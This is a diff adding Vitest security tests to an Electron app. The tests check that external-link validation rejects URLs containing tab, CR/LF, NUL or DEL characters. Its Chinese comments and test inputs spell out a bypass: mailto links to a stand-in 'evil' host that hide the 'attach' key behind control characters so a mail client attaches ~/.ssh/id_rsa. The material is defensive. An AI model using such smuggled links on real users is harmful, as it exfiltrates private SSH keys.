@@ -131,3 +131,39 @@ describe('安全 L4 · mailto 去 attach 参数', () => {
     }
   });
 });
+
+// 安全:shell.openExternal 把 URL 交 GURL 解析时按 URL 规范先删掉 Tab / CR / LF。若净化在删之前做,
+// `mailto:x?att<TAB>ach=~/.ssh/id_rsa` 的键是 `att\tach` 不被删,交出后却变成 attach → 绕过 L4。
+// 正常外链(Markdown 链接目标 / 终端链接 / Chromium 规范化后的 window.open URL)不含 C0 控制字符与 DEL,
+// 故所有 scheme 一律拒绝含这类字符的外链(fail-closed),而不是猜测下游如何剥离。
+describe('安全 · 外链含 C0 控制字符 / DEL 一律拒绝', () => {
+  it('Tab / CR / LF / NUL / DEL 拼进键名或任意位置 → 拒绝(各 scheme)', () => {
+    expect(isAllowedExternalUrl('mailto:x@evil?att\tach=~/.ssh/id_rsa')).toBe(false);
+    expect(isAllowedExternalUrl('mailto:x@evil?att\nach=~/.ssh/id_rsa')).toBe(false);
+    expect(isAllowedExternalUrl('mailto:x@evil?att\r\nach=~/.ssh/id_rsa')).toBe(false);
+    expect(isAllowedExternalUrl('https://x.test/\u0000a')).toBe(false);
+    expect(isAllowedExternalUrl('http://x.test/a\u007f')).toBe(false);
+    expect(isAllowedExternalUrl('ht\ttps://x.test/')).toBe(false);
+    expect(isAllowedExternalUrl('https://x.test/\u001f')).toBe(false);
+  });
+
+  it('正常链接(含空格 / 百分号编码的 %09 / 非 ASCII)不受影响', () => {
+    expect(isAllowedExternalUrl('https://x.test/a b')).toBe(true);
+    expect(isAllowedExternalUrl('mailto:a@b.com?subject=a%09b')).toBe(true);
+    expect(isAllowedExternalUrl('https://例子.测试/路径?q=值')).toBe(true);
+  });
+
+  it('openExternalUrl(IPC 出口)拒绝且不调用 shell.openExternal', async () => {
+    vi.resetModules();
+    const openExternal = vi.fn(async () => undefined);
+    vi.doMock('electron', () => ({ shell: { openExternal } }));
+    try {
+      const mod = await import('../../../electron/main/services/shell.service');
+      await expect(mod.openExternalUrl({ url: 'mailto:x@evil?att\tach=~/.ssh/id_rsa' })).rejects.toThrow();
+      expect(openExternal).not.toHaveBeenCalled();
+    } finally {
+      vi.doUnmock('electron');
+      vi.resetModules();
+    }
+  });
+});
